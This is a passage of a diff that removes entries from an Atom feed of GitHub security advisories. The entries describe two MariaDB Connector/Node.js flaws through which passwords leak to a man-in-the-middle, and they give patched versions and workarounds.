-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-28T22:04:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB has Cleartext Transmission of Sensitive Information and Insufficiently Protected Credentials]]></title>
-        <id>https://github.com/advisories/GHSA-42r5-vhpq-m858</id>
-        <link href="https://github.com/advisories/GHSA-42r5-vhpq-m858"/>
-        <updated>2026-08-28T22:04:54.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When PAM (dialog) authentication is used, the connector can be coerced into sending the account password in cleartext over an insecure connection. A hostile or man-in-the-middle server can trigger this with the default configuration, disclosing the user's password.</p>
-<h3 id="details">Details</h3>
-<p>The mysql_clear_password plugin is gated behind a secure connection: the driver refuses to transmit the password in cleartext over plain TCP. The sibling PAM plugin handler (SendPamAuthPacketFactory, server-side plugin name dialog) did not override that gate and inherited the default value false, so it was not subject to the same secure-transport requirement.</p>
-<p>As a result, a hostile or man-in-the-middle server can issue an Authentication Switch Request for the dialog plugin over plain TCP, and the driver responds with the user's password in cleartext. With the default configuration (sslMode=DISABLE, restrictedAuth=null) this is reachable with no non-default options.</p>
-<h3 id="am-i-affected">Am I affected?</h3>
-<p>You are affected if all of the following hold:</p>
-<p>You use mariadb Connector/Node.js at a version below the patched release(s).
-Connections can occur over an insecure transport: plain TCP (sslMode=DISABLE), or a TLS mode that establishes server identity only via self-signed-certificate fingerprint validation.
-An attacker can occupy an on-path (MITM) position, or otherwise cause the client to connect to a server they control, and present an Authentication Switch Request for the dialog plugin.</p>
-<p>Connections over properly verified TLS or a local Unix socket are not exposed to this vector.</p>
-<h3 id="impact">Impact</h3>
-<p>Disclosure of the authenticating account's password in cleartext to an on-path or hostile server. The captured credentials can then be reused to authenticate to the database (and, if reused elsewhere, beyond it).</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in 3.2.4, 3.3.3, 3.4.6, and 3.5.3. Upgrade to the patched release on your branch (3.5.x → 3.5.3, 3.4.x → 3.4.6, 3.3.x → 3.3.3, 3.2.x and earlier → 3.2.4). PAM (dialog) is now treated exactly like mysql_clear_password: it may only run over a secure transport. SendPamAuthPacketFactory overrides the secure-required flag to true, and the authentication dispatcher permits a secure-required plugin only when the connection is TLS or a local Unix socket. The pre-existing check that blocks non-MITM-proof plugins when server identity relies solely on self-signed-certificate fingerprint validation continues to apply. Net effect: PAM is allowed over TLS or a Unix socket, and rejected over plain TCP or fingerprint-only connections.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately:</p>
-<ul>
-<li>Restrict the permitted authentication plugins via restrictedAuth so dialog cannot be negotiated over an insecure transport.
-Avoid PAM (dialog) authentication over plain TCP.</li>
-</ul>
-<p>###Credit</p>
-<p>Reported by Yalguun Tumenkhuu (<a href="https://github.com/fg0x0/">@fg0x0</a>).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-42r5-vhpq-m858">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-42r5-vhpq-m858</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/29733403cfe6519cdfe9c36c93765a468fbe285d">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/29733403cfe6519cdfe9c36c93765a468fbe285d</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/53b304264df84496d331dba2765c3634602f342e">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/53b304264df84496d331dba2765c3634602f342e</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/9781de636841d34afdd08d81dd07d43edb82f85c">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/9781de636841d34afdd08d81dd07d43edb82f85c</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/fbc159c2c8bd18c2db2d2e6587ab3020bbda64b6">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/fbc159c2c8bd18c2db2d2e6587ab3020bbda64b6</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.2.4</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.3</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.6">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.6</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.3</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-353">https://jira.mariadb.org/browse/CONJS-353</a></li>
-<li><a href="https://github.com/advisories/GHSA-42r5-vhpq-m858">https://github.com/advisories/GHSA-42r5-vhpq-m858</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-42r5-vhpq-m858</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-28T22:04:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB's connector leaks the cleartext password to an MitM despite `ssl: true`]]></title>
-        <id>https://github.com/advisories/GHSA-cqhc-2h57-wpxf</id>
-        <link href="https://github.com/advisories/GHSA-cqhc-2h57-wpxf"/>
-        <updated>2026-08-28T19:03:39.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When SSL/TLS is enabled but no CA / server certificate is provided, the
-connector verifies the server's identity using fingerprint validation. The
-check is effective,  the connection is ultimately rejected when it fails, 
-but it happens <em>after</em> the authentication exchange. As a result, the
-credentials are sent before validation occurs, so an active man-in-the-middle
-who presents their own certificate receives the password in the handshake
-before the connection is aborted.</p>
-<h3 id="impact">Impact</h3>
-<p>The credentials are transmitted to the peer before the server's identity is
-validated. An on-path attacker (MitM) presenting any certificate can capture
-the account password, even though the connection then fails the fingerprint
-check and is closed. The disclosed credentials can subsequently be used to
-authenticate directly against the server.</p>
-<ul>
-<li>Attacker requirement: active man-in-the-middle position on the network path</li>
-<li>Affected configuration: SSL/TLS enabled without a CA / server certificate</li>
-</ul>
-<h3 id="affected-versions">Affected versions</h3>
-<ul>
-<li>&lt; 3.2.4</li>
-<li>3.3.0 – 3.3.2</li>
-<li>3.4.0 – 3.4.5</li>
-<li>3.5.0 – 3.5.2</li>
-</ul>
-<h3 id="patches">Patches</h3>
-<p>Fixed in 3.2.4, 3.3.3, 3.4.6, and 3.5.3. Upgrade to one of these (or later)
-on your branch.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Until you can upgrade, configure certificate verification explicitly, provide
-the server/CA certificate and use a verifying SSL mode (e.g. VERIFY_CA /
-VERIFY_FULL). </p>
-<p>Reported by haaahaaahiihiiii (no GitHub account).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-cqhc-2h57-wpxf">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-cqhc-2h57-wpxf</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/514576a5a1fab3ea8498613e259a0b7a764e7302">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/514576a5a1fab3ea8498613e259a0b7a764e7302</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/c47d7275835c78c7eb8186cd23e9d57c045c128b">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/c47d7275835c78c7eb8186cd23e9d57c045c128b</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/ecd36958e6e3bf0e0fa8389546f50c0ed6dbb2ac">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/ecd36958e6e3bf0e0fa8389546f50c0ed6dbb2ac</a></li>
-<li><a href="https://hackerone.com/reports/3777370">https://hackerone.com/reports/3777370</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.3</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.6">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.6</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.3">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.3</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-349">https://jira.mariadb.org/browse/CONJS-349</a></li>
-<li><a href="https://github.com/advisories/GHSA-cqhc-2h57-wpxf">https://github.com/advisories/GHSA-cqhc-2h57-wpxf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cqhc-2h57-wpxf</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-28T19:03:38.000Z</published>
     </entry>
 </feed>
